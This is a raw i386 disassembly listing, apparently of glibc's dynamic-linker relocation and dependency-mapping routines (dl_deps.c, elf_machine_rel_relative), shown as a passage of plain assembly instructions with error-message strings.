mov dword [var_94h], ecx
xor esi, esi
mov eax, dword [var_58h]
lea ecx, [var_58h]
mov eax, dword [eax]
mov dword [var_8h], edx
mov dword [var_sp_ch], esi
mov edx, dword [var_94h]
add eax, dword [var_10h]
mov dword [var_sp_10h], 0
mov dword [var_4h], edx
mov edx, dword [arg_ch]
mov dword [esp], edx
mov edx, dword [arg_8h]
call fcn.0807e450
mov ecx, dword [var_58h]
mov edx, dword [arg_8h]
sub esp, 0x14
mov dword [var_90h], eax
mov dword [edx + 0x20c], ecx
mov dword [edx + 0x208], eax
mov edx, ecx
xor esi, esi
test edx, edx
je 0x807fa34
mov ecx, dword [var_90h]
mov esi, dword [edx + 4]
add esi, dword [ecx]
cmp ebx, 0x25
ja case.0x807fd5f.0
jmp dword [ebx*4 + 0x80a42d0]
mov ebx, dword [var_88h]
mov dword [ebx], esi
lea esi, [esi]
mov esi, dword [arg_8h]
add edi, 8
cmp edi, dword [var_78h]
jb 0x807f8f0
jmp 0x807eef0
mov ecx, dword [var_88h]
add dword [ecx], esi
jmp 0x807fa50
mov ebx, dword [var_88h]
sub esi, dword [var_88h]
add dword [ebx], esi
jmp 0x807fa50
test edx, edx
je 0x807fa50
mov eax, dword [var_8ch]
mov ecx, dword [eax + 8]
cmp dword [edx + 8], ecx
ja 0x807fabb
jb 0x807fab2
mov eax, dword [edx + 8]
mov dword [var_4h], esi
cmp ecx, eax
cmovbe eax, ecx
mov dword [var_8h], eax
mov eax, dword [var_88h]
mov dword [esp], eax
call fcn.08053770
jmp 0x807fa50
mov eax, dword [0x80aac54]
test eax, eax
je 0x807fa92
mov eax, dword [0x80a95a8]
mov edx, dword [var_70h]
mov ebx, dword [var_8ch]
mov eax, dword [eax]
mov ecx, dword [edx + 0x2c]
mov edx, str._program_name_unknown_
test eax, eax
cmovne edx, eax
mov eax, dword [ebx]
add eax, dword [ecx + 4]
mov dword [var_8h], edx
mov dword [var_4h], str._s:_Symbol___s_has_different_size_in_shared_object__consider_re_linking_n
mov dword [esp], 2
mov dword [var_sp_ch], eax
call fcn.08081ca0
mov edx, dword [var_58h]
mov ecx, dword [ebx + 8]
jmp 0x807fa92
test edx, edx
je 0x807fa50
mov ecx, dword [var_90h]
mov ebx, dword [ecx + 0x224]
test ebx, ebx
je 0x807fb2b
mov eax, dword [edx + 4]
mov edx, dword [var_88h]
sub eax, ebx
add dword [edx], eax
jmp 0x807fa50
mov eax, ecx
call fcn.0807ec80
mov eax, dword [var_90h]
mov edx, dword [var_58h]
mov ebx, dword [eax + 0x224]
jmp 0x807fb19
mov eax, dword [var_70h]
xor ecx, ecx
mov edx, ebx
jmp 0x807f3b0
mov eax, dword [var_90h]
test eax, eax
je 0x807fa50
mov edx, dword [var_90h]
mov ecx, dword [var_88h]
mov eax, dword [edx + 0x228]
mov dword [ecx], eax
jmp 0x807fa50
test edx, edx
je 0x807fa50
mov eax, dword [edx + 4]
mov ebx, dword [var_88h]
mov dword [ebx], eax
jmp 0x807fa50
test edx, edx
je 0x807fa50
mov eax, dword [var_90h]
mov ebx, dword [eax + 0x224]
test ebx, ebx
je 0x807fbb6
mov eax, dword [var_88h]
sub ebx, dword [edx + 4]
add dword [eax], ebx
jmp 0x807fa50
call fcn.0807ec80
mov ecx, dword [var_90h]
mov edx, dword [var_58h]
mov ebx, dword [ecx + 0x224]
jmp 0x807fba6
mov eax, 1
jmp 0x807f994
xor edx, edx
cmp ebx, 7
je 0x807fc23
cmp ebx, 0x23
je 0x807fc23
cmp ebx, 0x24
je 0x807fc23
cmp ebx, 0x25
je 0x807fc23
cmp ebx, 0xe
je 0x807fc23
cmp ebx, 5
mov eax, dword [esi + 0x204]
je 0x807fc1e
cmp edx, eax
jne 0x807f965
mov edx, dword [esi + 0x20c]
mov esi, dword [esi + 0x208]
mov dword [var_58h], edx
mov dword [var_90h], esi
jmp 0x807fa23
or edx, 2
jmp 0x807fbfc
mov edx, 1
jmp 0x807fbf1
mov edx, dword [var_70h]
mov ecx, dword [var_88h]
mov eax, dword [edx]
add dword [ecx], eax
jmp 0x807fa53
lea esi, [esi]
cmp edi, dword [var_78h]
jae 0x807eef0
lea esi, [esi]
mov edx, dword [edi + 4]
mov ebx, dword [var_7ch]
add ebx, dword [edi]
mov ecx, dword [var_80h]
mov eax, edx
shr eax, 8
shl eax, 4
mov dword [var_98h], ebx
movzx ebx, dl
add ecx, eax
cmp ebx, 8
mov dword [var_5ch], ecx
je 0x807ff34
test ebx, ebx
je 0x807fd73
mov dword [var_9ch], ecx
movzx eax, byte [ecx + 0xc]
mov dword [var_a0h], esi
shr al, 4
test al, al
je 0x807fd45
cmp ecx, dword [esi + 0x200]
je 0x807fee0
xor eax, eax
cmp ebx, 7
je 0x807fed6
cmp ebx, 0x23
je 0x807fed6
cmp ebx, 0x24
je 0x807fed6
cmp ebx, 0x25
je 0x807fed6
cmp ebx, 0xe
je 0x807fed6
mov edx, eax
lea ecx, [var_5ch]
or edx, 2
cmp ebx, 5
cmovne edx, eax
mov eax, dword [var_9ch]
mov dword [esi + 0x204], edx
mov dword [esi + 0x200], eax
mov eax, dword [var_5ch]
mov eax, dword [eax]
mov dword [var_4h], 0
mov dword [var_8h], edx
mov edx, dword [arg_ch]
add eax, dword [var_10h]
mov dword [var_sp_10h], 0
mov dword [var_sp_ch], 1
mov dword [esp], edx
mov edx, dword [arg_8h]
call fcn.0807e450
mov ecx, dword [var_5ch]
mov edx, dword [arg_8h]
sub esp, 0x14
mov dword [var_a0h], eax
mov dword [edx + 0x20c], ecx
mov dword [edx + 0x208], eax
xor esi, esi
test ecx, ecx
je 0x807fd56
mov edx, dword [var_a0h]
mov esi, dword [ecx + 4]
add esi, dword [edx]
cmp ebx, 0x25
ja case.0x807fd5f.0
jmp dword [ebx*4 + 0x80a4368]
mov ecx, dword [var_98h]
mov dword [ecx], esi
mov esi, esi
mov esi, dword [arg_8h]
add edi, 8
cmp edi, dword [var_78h]
jb 0x807fc50
jmp 0x807eef0
mov ecx, dword [var_98h]
add dword [ecx], esi
jmp 0x807fd70
mov ebx, dword [var_98h]
sub esi, dword [var_98h]
add dword [ebx], esi
jmp 0x807fd70
test ecx, ecx
je 0x807fd70
mov eax, dword [var_9ch]
mov edx, dword [eax + 8]
cmp dword [ecx + 8], edx
ja 0x807fddb
jb 0x807fdd2
mov eax, dword [ecx + 8]
mov dword [var_4h], esi
cmp edx, eax
cmovbe eax, edx
mov dword [var_8h], eax
mov eax, dword [var_98h]
mov dword [esp], eax
call fcn.08053770
jmp 0x807fd70
mov eax, dword [0x80aac54]
test eax, eax
je 0x807fdb2
mov eax, dword [0x80a95a8]
mov edx, dword [var_70h]
mov ebx, dword [var_9ch]
mov eax, dword [eax]
mov ecx, dword [edx + 0x2c]
mov edx, str._program_name_unknown_
test eax, eax
cmovne edx, eax
mov eax, dword [ebx]
add eax, dword [ecx + 4]
mov dword [var_8h], edx
mov dword [var_4h], str._s:_Symbol___s_has_different_size_in_shared_object__consider_re_linking_n
mov dword [esp], 2
mov dword [var_sp_ch], eax
call fcn.08081ca0
mov ecx, dword [var_5ch]
mov edx, dword [ebx + 8]
jmp 0x807fdb2
test ecx, ecx
je 0x807fd70
mov ebx, dword [var_a0h]
mov edx, dword [ebx + 0x224]
test edx, edx
je 0x807fe4b
mov eax, dword [ecx + 4]
sub eax, edx
mov edx, dword [var_98h]
add dword [edx], eax
jmp 0x807fd70
mov eax, ebx
call fcn.0807ec80
mov ecx, dword [var_5ch]
mov edx, dword [ebx + 0x224]
jmp 0x807fe39
mov eax, dword [var_a0h]
test eax, eax
je 0x807fd70
mov ebx, dword [var_a0h]
mov edx, dword [var_98h]
mov eax, dword [ebx + 0x228]
mov dword [edx], eax
jmp 0x807fd70
test ecx, ecx
je 0x807fd70
mov eax, dword [ecx + 4]
mov ecx, dword [var_98h]
mov dword [ecx], eax
jmp 0x807fd70
test ecx, ecx
je 0x807fd70
mov ebx, dword [var_a0h]
mov edx, dword [ebx + 0x224]
test edx, edx
je 0x807fec4
mov eax, dword [var_98h]
sub edx, dword [ecx + 4]
add dword [eax], edx
jmp 0x807fd70
mov eax, ebx
call fcn.0807ec80
mov ecx, dword [var_5ch]
mov edx, dword [ebx + 0x224]
jmp 0x807feb4
mov eax, 1
jmp 0x807fcd8
xor edx, edx
cmp ebx, 7
je 0x807ff2d
cmp ebx, 0x23
je 0x807ff2d
cmp ebx, 0x24
je 0x807ff2d
cmp ebx, 0x25
je 0x807ff2d
cmp ebx, 0xe
je 0x807ff2d
cmp ebx, 5
mov eax, dword [esi + 0x204]
je 0x807ff28
cmp edx, eax
jne 0x807fca9
mov ecx, dword [esi + 0x20c]
mov esi, dword [esi + 0x208]
mov dword [var_5ch], ecx
mov dword [var_a0h], esi
jmp 0x807fd45
or edx, 2
jmp 0x807ff06
mov edx, 1
jmp 0x807fefb
mov edx, dword [var_70h]
mov ecx, dword [var_98h]
mov eax, dword [edx]
add dword [ecx], eax
jmp 0x807fd73
mov ebx, dword [var_10h_2]
mov eax, dword [esi + 0x74]
test ebx, ebx
mov ecx, dword [eax + 4]
jne 0x807ff5f
mov edx, dword [var_30h_2]
mov eax, dword [var_34h_2]
add eax, edx
cmp eax, ecx
je 0x807ff76
mov eax, dword [esi + 0x20]
mov dword [var_28h], ecx
mov ebx, dword [var_10h_2]
mov eax, dword [eax + 4]
mov dword [var_20h], ebx
mov dword [var_24h_2], eax
jmp 0x807ee86
mov eax, dword [esi + 0x20]
add edx, dword [eax + 4]
mov dword [var_30h_2], edx
jmp 0x807ee86
mov eax, dword [0x80aac20]
mov dword [edx + 8], 0x80811b0
mov edx, esi
call fcn.08081cd0
test eax, eax
je 0x807ffa1
mov dword [0x80aac60], esi
mov esi, dword [var_4h_3]
jmp 0x807ee43
movzx eax, word [esi + 0x14c]
mov ebx, dword [esi + 0x144]
shl eax, 5
lea eax, [eax + ebx]
cmp ebx, eax
jae 0x807edf9
cmp dword [ebx], 1
je 0x807ffe5
movzx eax, word [esi + 0x14c]
add ebx, 0x20
shl eax, 5
add eax, dword [esi + 0x144]
cmp ebx, eax
jb 0x807ffc4
jmp 0x807edf9
test byte [ebx + 0x18], 2
jne 0x807ffc9
mov ecx, dword [ebx + 8]
mov eax, dword [0x80aac74]
sub esp, 0x20
lea edi, [var_23h]
and edi, 0xfffffff0
mov edx, ecx
add edx, dword [ebx + 0x14]
lea edx, [eax + edx - 1]
neg eax
and ecx, eax
and edx, eax
sub edx, ecx
mov dword [edi + 4], edx
and eax, dword [ebx + 8]
add eax, dword [esi]
mov dword [edi], eax
mov dword [var_8h_4], 3
mov eax, dword [edi + 4]
mov dword [var_4h_5], eax
mov eax, dword [edi]
mov dword [esp], eax
call fcn.080547a0
test eax, eax
js 0x808005c
mov ecx, dword [ebx + 0x18]
mov eax, 0x73516240
mov esi, dword [var_4h_3]
and ecx, 7
shl ecx, 2
sar eax, cl
mov ecx, dword [var_68h_2]
mov dword [var_68h_2], edi
and eax, 0xf
mov dword [edi + 8], eax
mov dword [edi + 0xc], ecx
jmp 0x807ffc9
mov ebx, str.cannot_make_segment_writable_for_relocation
jmp 0x807f227
mov eax, dword [arg_10h]
mov edx, str.__lazy_
test eax, eax
mov eax, 0x80a4f11
cmove edx, eax
mov dword [var_8h], edx
mov eax, dword [esi + 4]
cmp byte [eax], 0
jne 0x808008b
mov eax, dword [0x80a95a8]
mov eax, dword [eax]
mov dword [var_4h], eax
mov dword [esp], str._nrelocation_processing:__s_s_n
call fcn.08081c40
mov esi, dword [var_4h_3]
jmp 0x807edee
mov dword [var_sp_ch], str.elf_machine_rel_relative
mov dword [var_8h], 0x288
mov dword [var_4h], str..._sysdeps_i386_dl_machine.h
mov dword [esp], str.__reloc__r_info___0xff___8
call fcn.0805efc0
mov esi, esi
lea edi, [edi]
push ebp
mov ebp, esp
sub esp, 0x10
mov dword [var_bp_4h], ebx
mov edx, dword [eax + 0x22c]
mov ebx, eax
add edx, dword [eax]
mov eax, dword [0x80aac74]
dec eax
mov ecx, edx
not eax
add edx, dword [ebx + 0x230]
and ecx, eax
and edx, eax
cmp ecx, edx
je 0x8080115
sub edx, ecx
mov dword [var_8h_2], 1
mov dword [esp], ecx
mov dword [var_4h_2], edx
call fcn.080547a0
test eax, eax
js 0x808011a
mov ebx, dword [var_bp_4h]
leave
ret
call fcn.08048b20
xor ecx, ecx
mov dword [esp], 0x80a4400
mov edx, dword [ebx + 4]
mov eax, dword [eax]
call fcn.08081200
lea esi, [esi]
lea edi, [edi]
push ebp
shl ecx, 5
mov ebp, esp
add ecx, str.unexpected_reloc_type_0x
sub esp, 0x34
mov dword [var_ch_2], ebx
mov dword [var_bp_8h], esi
mov dword [var_4h_3], ecx
mov ebx, edx
lea esi, [var_2ch_2]
mov dword [ebp - 4], edi
mov dword [esp], esi
mov edi, eax
call fcn.080773c0
mov edx, ebx
xor ecx, ecx
and ebx, 0xf
shr edx, 4
and edx, 0xf
movzx edx, byte [edx + 0x80a0960]
mov byte [eax], dl
movzx edx, byte [ebx + 0x80a0960]
inc eax
mov byte [eax + 1], 0
mov byte [eax], dl
xor eax, eax
mov dword [esp], esi
mov edx, dword [edi + 4]
call fcn.08081200
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ecx, 1
mov ebp, esp
sub esp, 0x18
mov dword [var_ch_3], ebx
mov dword [ebp - 8], esi
mov dword [ebp - 4], edi
mov ebx, dword [var_4h_3]
mov esi, 3
mov edi, 3
mov eax, dword [ebx + 8]
mov edx, dword [ebx + 0x10]
mov dword [var_8h_3], eax
mov eax, dword [ebx + 4]
mov dword [var_4h_4], eax
mov eax, dword [ebx]
movzx eax, byte [eax + 0x174]
and esi, eax
and edi, eax
mov eax, esi
test al, al
cmovne ecx, edi
mov dword [esp], ecx
mov eax, dword [ebx]
xor ecx, ecx
call fcn.0807cfa0
mov dword [ebx + 0x14], eax
sub esp, 0xc
mov edi, dword [ebp - 4]
mov ebx, dword [var_ch_3]
mov esi, dword [ebp - 8]
leave
ret
lea esi, [esi]
lea edi, [edi]
push ebp
mov ebp, esp
push edi
mov edi, eax
push esi
lea esi, [eax + 4]
push ebx
mov dword [eax], edx
movzx eax, byte [edx + 0x174]
and eax, 0xffffff9f
or eax, 0x20
mov byte [edx + 0x174], al
mov eax, dword [edx + 0x1d8]
test eax, eax
je 0x8080276
mov edx, dword [eax + 4]
lea ebx, [eax + 4]
test edx, edx
je 0x8080276
test byte [edx + 0x174], 0x60
je 0x8080282
add ebx, 4
mov edx, dword [ebx]
test edx, edx
jne 0x8080264
sub esi, edi
sar esi, 2
pop ebx
mov eax, esi
pop esi
pop edi
leave
ret
mov eax, esi
call fcn.08080230
lea esi, [esi + eax*4]
jmp 0x808026d
mov esi, esi
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x94
mov dword [var_48h], ecx
mov dword [var_44h], edx
mov dword [var_40h], eax
mov edx, dword [var_40h]
lea eax, [ecx + ecx*2]
lea eax, [eax*4 + 0x28]
mov ecx, dword [var_40h]
sub esp, eax
lea eax, [var_1fh]
and eax, 0xfffffff0
mov dword [eax + 4], edx
mov dword [var_10h], eax
mov dword [eax], 0
lea edx, [eax + 0xc]
mov dword [var_14h], 1
mov dword [eax + 8], edx
movzx eax, byte [ecx + 0x174]
and eax, 0xffffff9f
or eax, 0x20
mov byte [ecx + 0x174], al
mov ebx, dword [var_48h]
mov dword [var_50h], 0
cmp dword [var_50h], ebx
jae 0x8080349
mov edi, dword [var_14h]
mov eax, dword [var_50h]
mov edx, dword [var_44h]
mov ecx, dword [var_10h]
mov esi, dword [edx + eax*4]
lea eax, [edi + edi*2]
inc edi
shl eax, 2
mov dword [var_8ch], edi
lea edx, [eax + ecx + 0xc]
mov dword [ecx + eax], 0
mov dword [var_14h], edi
mov dword [ecx + eax + 4], esi
mov dword [ecx + eax + 8], edx
movzx eax, byte [esi + 0x174]
and eax, 0xffffff9f
or eax, 0x20
mov byte [esi + 0x174], al
mov ecx, dword [var_48h]
inc dword [var_50h]
cmp dword [var_50h], ecx
jb 0x80802f9
mov eax, dword [var_14h]
mov esi, dword [var_10h]
lea eax, [eax + eax*2]
lea eax, [esi + eax*4 - 0xc]
mov dword [eax + 8], 0
mov dword [var_4ch], eax
call fcn.08048b20
test esi, esi
mov dword [var_38h], 0
mov ebx, dword [eax]
mov dword [var_58h], 0
mov dword [eax], 0
mov dword [var_54h], ebx
mov ebx, esi
je 0x8080593
mov esi, dword [ebx + 4]
mov dword [var_60h], 0
mov dword [var_64h], 0
mov dword [ebx], 1
mov eax, dword [esi + 0x150]
mov dword [var_5ch], esi
test eax, eax
jne 0x80803e4
mov eax, dword [esi + 0x1d8]
test eax, eax
jne 0x80803e4
mov eax, dword [var_40h]
cmp esi, eax
je 0x80803e4
movzx eax, word [esi + 0x14e]
test ax, ax
je 0x80803e4
movzx eax, ax
lea eax, [eax*4 + 0x12]
and eax, 0xffffc
sub esp, eax
lea edx, [var_1fh]
and edx, 0xfffffff0
mov dword [var_60h], edx
mov ecx, dword [var_5ch]
mov eax, dword [ecx + 0x1c]
test eax, eax
jne 0x8080406
mov eax, dword [ecx + 0xe8]
test eax, eax
jne 0x8080406
mov eax, dword [ecx + 0xe0]
test eax, eax
je 0x80804f4
mov esi, dword [var_5ch]
mov edx, dword [arg_ch]
mov eax, dword [esi + 0x2c]
mov ecx, dword [esi + 8]
mov eax, dword [eax + 4]
mov dword [var_70h], ecx
mov dword [var_6ch], ebx
mov dword [var_2ch], edx
mov dword [var_34h], esi
mov dword [var_68h], eax
mov dword [var_28h], eax
mov eax, dword [arg_8h]
mov dword [var_30h], eax
mov eax, dword [ecx]
test eax, eax
je 0x80804f4
cmp eax, 1
jne 0x8080bc8
mov eax, dword [var_70h]
mov esi, dword [var_68h]
add esi, dword [eax + 4]
mov dword [var_4h], 0x24
mov dword [esp], esi
mov edi, esi
call fcn.08076ce0
test eax, eax
jne 0x8080a97
lea eax, [var_34h]
lea edx, [var_38h]
mov ecx, 0x80801c0
mov dword [esp], eax
mov dword [var_24h], edi
lea eax, [var_3ch]
call fcn.08081410
mov edx, dword [var_38h]
sub esp, 4
test edx, edx
jne 0x8080a80
mov edx, dword [var_20h]
test byte [edx + 0x174], 0x60
jne 0x80804cf
mov ecx, dword [var_4ch]
sub esp, 0x1c
lea eax, [var_1fh_2]
and eax, 0xfffffff0
mov dword [eax], 0
mov dword [eax + 8], 0
mov dword [eax + 4], edx
mov dword [ecx + 8], eax
mov dword [var_4ch], eax
inc dword [var_14h]
movzx eax, byte [edx + 0x174]
and eax, 0xffffff9f
or eax, 0x20
mov byte [edx + 0x174], al
mov eax, dword [var_60h]
test eax, eax
je 0x80804e3
mov esi, dword [var_64h]
mov eax, dword [var_60h]
mov dword [eax + esi*4], edx
inc esi
mov dword [var_64h], esi
add dword [var_70h], 8
mov edx, dword [var_70h]
mov eax, dword [edx]
test eax, eax
jne 0x8080437
mov eax, dword [var_60h]
test eax, eax
je 0x8080578
mov ecx, dword [var_64h]
mov esi, dword [var_60h]
mov dword [esi + ecx*4], 0
inc ecx
lea eax, [ecx*8 + 4]
mov dword [var_64h], ecx
mov dword [esp], eax
call fcn.08050fe0
mov edx, eax
mov eax, dword [var_5ch]
test edx, edx
mov dword [eax + 0x1d8], edx
je 0x8080a6e
mov eax, dword [var_64h]
mov esi, dword [var_5ch]
lea edi, [edx + 4]
cld
shl eax, 2
mov dword [edx], esi
mov esi, dword [var_60h]
mov ecx, eax
shr ecx, 2
rep movsd dword es:[edi], dword ptr [esi]
mov edx, dword [var_5ch]
mov esi, dword [edx + 0x1d8]
lea edi, [esi + eax + 4]
shr eax, 2
mov ecx, eax
xor eax, eax
test eax, eax
rep movsd dword es:[edi], dword ptr [esi]
je 0x808056d
movzx eax, word [esi]
add esi, 2
mov word [edi], ax
add edi, 2
xor eax, eax
test eax, eax
je 0x8080578
movzx eax, byte [esi]
mov byte [edi], al
mov edi, dword [ebx]
test edi, edi
je 0x808058b
mov ebx, dword [ebx + 8]
test ebx, ebx
je 0x8080593
mov esi, dword [ebx]
test esi, esi
jne 0x808057e
test ebx, ebx
jne 0x8080388
call fcn.08048b20
mov ecx, dword [eax]
test ecx, ecx
jne 0x80805aa
mov edx, dword [var_54h]
test edx, edx
je 0x80805aa
mov ebx, dword [var_54h]
mov dword [eax], ebx
mov esi, dword [var_40h]
mov edx, dword [esi + 0x1d8]
test edx, edx
je 0x80805c9
movzx eax, byte [esi + 0x174]
and eax, 3
cmp al, 2
je 0x8080a33
mov eax, dword [var_14h]
lea eax, [eax*8 + 4]
mov dword [esp], eax
call fcn.08050fe0
mov edx, dword [var_40h]
test eax, eax
mov dword [edx + 0x1d8], eax
je 0x8080a2c
mov edx, dword [var_14h]
mov ebx, dword [var_40h]
lea eax, [eax + edx*4 + 4]
mov dword [ebx + 0x154], edx
mov dword [var_14h], 0
mov dword [ebx + 0x150], eax
mov ebx, dword [var_10h]
test ebx, ebx
je 0x8080642
mov eax, dword [arg_8h]
test eax, eax
jne 0x8080a0e
mov esi, dword [ebx + 4]
mov ecx, dword [var_40h]
mov edx, dword [var_14h]
mov eax, dword [ecx + 0x150]
mov dword [eax + edx*4], esi
mov esi, dword [ebx + 4]
inc edx
mov dword [var_14h], edx
and byte [esi + 0x174], 0x9f
mov ebx, dword [ebx + 8]
test ebx, ebx
jne 0x8080610
test byte [0x80aac11], 2
jne 0x8080899
mov edx, dword [var_40h]
mov esi, dword [edx + 0x150]
mov eax, dword [var_40h]
cmp dword [esi], eax
jne 0x8080875
mov edx, dword [var_40h]
mov dword [var_50h], 0
mov edx, dword [edx + 0x1e0]
cmp dword [var_50h], edx
mov dword [var_90h], edx
jae 0x8080867
mov ecx, dword [var_14h]
mov dword [var_8ch], ecx
mov edi, 1
cmp edi, dword [var_8ch]
jae 0x80806b9
mov ebx, dword [var_40h]
mov edx, dword [ebx + 0x1e4]
mov ecx, dword [var_50h]
mov eax, dword [esi + edi*4]
cmp eax, dword [edx + ecx*4]
je 0x808081f
inc edi
cmp edi, dword [var_8ch]
jb 0x80806a1
inc dword [var_50h]
mov ecx, dword [var_90h]
cmp dword [var_50h], ecx
jb 0x808068b
mov ecx, dword [var_8ch]
mov eax, dword [var_40h]
cld
shl ecx, 2
mov edi, dword [eax + 0x1d8]
shr ecx, 2
rep movsd dword es:[edi], dword ptr [esi]
mov dword [var_50h], 1
mov edx, dword [var_14h]
cmp dword [var_50h], edx
mov dword [var_8ch], edx
jae 0x8080811
mov edx, dword [eax + 0x1d8]
mov ecx, dword [var_40h]
mov esi, dword [var_50h]
mov dword [var_80h], 1
mov eax, dword [ecx + 0x150]
mov ebx, dword [eax + esi*4]
cmp dword [edx + 4], ebx
je 0x808072b
lea esi, [esi]
inc dword [var_80h]
mov eax, dword [var_80h]
cmp dword [edx + eax*4], ebx
jne 0x8080720
mov edi, dword [var_80h]
inc edi
cmp edi, dword [var_8ch]
jae 0x808077d
mov ecx, dword [var_80h]
shl ecx, 2
neg ecx
mov dword [var_88h], ecx
mov eax, dword [edx + edi*4]
mov esi, dword [eax + 0x1d8]
test esi, esi
je 0x8080774
mov eax, dword [esi]
test eax, eax
je 0x8080774
mov ecx, dword [var_88h]
lea ecx, [ecx + edi*4]
mov dword [var_84h], ecx
add esi, 4
cmp eax, ebx
je 0x80807c7
mov eax, dword [esi]
test eax, eax
jne 0x8080767
inc edi
cmp edi, dword [var_8ch]
jb 0x8080745
inc dword [var_50h]
mov eax, dword [var_8ch]
cmp dword [var_50h], eax
jb 0x80806fe
mov eax, dword [var_58h]
mov ebx, dword [var_8ch]
test eax, eax
mov dword [edx + ebx*4], 0
jne 0x80807ad
lea esp, [var_ch]
pop ebx
pop esi
pop edi
leave
ret 8
mov ecx, dword [var_38h]
xor eax, eax
mov edx, dword [var_3ch]
cmp dword [var_58h], 0xffffffff
cmovne eax, dword [var_58h]
mov dword [esp], ecx
xor ecx, ecx
call fcn.08081200
mov eax, dword [var_84h]
mov ecx, dword [var_80h]
mov esi, dword [edx + edi*4]
mov dword [var_8h], eax
lea eax, [edx + ecx*4]
mov dword [var_4h], eax
add eax, 4
mov dword [esp], eax
call fcn.08053690
sub dword [var_88h], 4
mov eax, dword [var_40h]
mov ecx, dword [var_80h]
mov edx, dword [eax + 0x1d8]
mov dword [edx + ecx*4], esi
mov esi, dword [var_14h]
inc ecx
mov dword [var_80h], ecx
mov dword [var_8ch], esi
jmp 0x8080774
mov ecx, dword [var_40h]
mov edx, dword [ecx + 0x1d8]
jmp 0x808078f
mov edi, ecx
dec dword [eax + 0x170]
inc edi
cmp edi, dword [var_90h]
jae 0x8080840
mov eax, dword [edx + edi*4]
mov dword [edx + edi*4 - 4], eax
inc edi
cmp edi, dword [var_90h]
jb 0x8080830
mov eax, dword [var_90h]
dec dword [var_50h]
mov ebx, dword [var_40h]
mov edx, dword [var_14h]
dec eax
mov dword [ebx + 0x1e0], eax
mov dword [var_8ch], edx
mov dword [var_90h], eax
jmp 0x80806b9
mov ebx, dword [var_14h]
mov dword [var_8ch], ebx
jmp 0x80806c7
mov dword [var_sp_ch], str._dl_map_object_deps
mov dword [var_8h], 0x22e
mov dword [var_4h], str.dl_deps.c
mov dword [esp], str.map__l_searchlist.r_list_0___map
call fcn.0805efc0
mov ebx, dword [var_40h]
cmp ebx, dword [0x80aac58]
je 0x80808b2
mov ecx, dword [var_40h]
mov esi, dword [ecx + 0x150]
jmp 0x8080658
mov esi, dword [var_14h]
mov dword [var_50h], 0
cmp dword [var_50h], esi
mov dword [var_8ch], esi
jae 0x8080a00
mov esi, dword [ebx + 0x150]
mov eax, dword [var_50h]
mov ebx, dword [esi + eax*4]
cmp ebx, dword [var_40h]
je 0x8080992
mov eax, dword [ebx + 0x1b8]
test eax, eax
je 0x80808f5
mov edi, dword [eax + 4]
test edi, edi
jne 0x8080992
mov ecx, dword [ebx + 0xe8]
test ecx, ecx
jne 0x80809e6
mov edx, dword [ebx + 0xe0]
test edx, edx
jne 0x80809e6
mov edx, dword [var_40h]
mov eax, dword [edx + 0x1d8]
mov edx, ebx
call fcn.08080230
cmp eax, dword [var_14h]
mov esi, eax
ja 0x80809c2
xor edx, edx
cmp edx, eax
jae 0x808094a
mov ecx, dword [var_40h]
mov eax, dword [ecx + 0x1d8]
mov eax, dword [eax + edx*4]
inc edx
and byte [eax + 0x174], 0x9f
cmp edx, esi
jb 0x8080932
lea eax, [esi*4]
mov dword [var_7ch], eax
add eax, 8
mov dword [esp], eax
call fcn.08050fe0
test eax, eax
mov dword [ebx + 0x1b8], eax
je 0x80809a9
mov ebx, dword [var_40h]
mov ecx, dword [var_7ch]
lea edi, [eax + 8]
mov dword [eax], edi
mov dword [eax + 4], esi
cld
mov esi, dword [ebx + 0x1d8]
shr ecx, 2
rep movsd dword es:[edi], dword ptr [esi]
mov esi, dword [var_14h]
mov dword [var_8ch], esi
mov esi, dword [ebx + 0x150]
inc dword [var_50h]
mov eax, dword [var_8ch]
cmp dword [var_50h], eax
jb 0x80808d1
jmp 0x8080658
mov ecx, dword [var_40h]
mov edx, dword [ecx + 4]
mov dword [esp], str.cannot_allocate_symbol_search_list
xor ecx, ecx
mov eax, 0xc
jmp 0x80807c2
mov dword [var_sp_ch], str._dl_map_object_deps
mov dword [var_8h], 0x21a
mov dword [var_4h], str.dl_deps.c
mov dword [esp], str.cnt___nlist
jmp 0x8080894
mov edx, dword [ebx + 4]
xor ecx, ecx
mov eax, 0x16
mov dword [esp], str.Filters_not_supported_with_LD_TRACE_PRELINKING
jmp 0x80807c2
lea esi, [esi]
mov ebx, dword [var_40h]
mov esi, dword [ebx + 0x150]
jmp 0x8080658
mov esi, dword [ebx + 4]
test byte [esi + 0x175], 2
je 0x808061e
mov eax, dword [var_40h]
dec dword [eax + 0x154]
jmp 0x8080634
mov ecx, edx
jmp 0x80809ac
mov eax, dword [esi + 0x150]
test eax, eax
jne 0x8080a4a
mov dword [esp], edx
call fcn.08051180
jmp 0x80805c9
mov dword [var_sp_ch], str._dl_map_object_deps
mov dword [var_8h], 0x1e2
mov dword [var_4h], str.dl_deps.c
mov dword [esp], str.map__l_searchlist.r_list____void__0_
jmp 0x8080894
mov ecx, dword [var_40h]
mov edx, dword [ecx + 4]
mov dword [esp], str.cannot_allocate_dependency_list
jmp 0x80809b6
test eax, eax
mov dword [var_58h], 0xffffffff
je 0x8080593
mov dword [var_58h], eax
jmp 0x8080593
mov dword [var_4h], 0
mov dword [esp], eax
call fcn.0807aeb0
test eax, eax
je 0x8080463
mov eax, dword [0x80a95f4]
test eax, eax
jne 0x8080bb6
mov dword [esp], esi
call fcn.08053400
mov ecx, dword [var_74h]
mov edi, eax
test ecx, ecx
je 0x8080b1f
mov edx, dword [var_5ch]
mov eax, dword [edx + 0x190]
test eax, eax
jne 0x8080b9e
mov eax, dword [edx + 4]
cmp byte [eax], 0
jne 0x8080b7a
call fcn.08083280
mov ecx, dword [var_5ch]
test eax, eax
mov dword [ecx + 0x190], eax
je 0x8080b76
cmp eax, 0xffffffff
je 0x8080b76
mov dword [esp], eax
call fcn.08053400
mov edx, eax
mov eax, dword [0x80aac0c]
cmp eax, edx
cmovb eax, edx
sub eax, 7
imul eax, dword [var_74h]
lea eax, [eax + edi]
add eax, 0x12
and eax, 0xfffffffc
sub esp, eax
lea eax, [var_1fh]
mov dword [var_sp_ch], 0
mov dword [var_4h], esi
and eax, 0xfffffff0
mov dword [var_8h], eax
mov eax, dword [var_5ch]
mov dword [esp], eax
call fcn.0807af60
cmp byte [eax], 0
mov edi, eax
jne 0x8080463
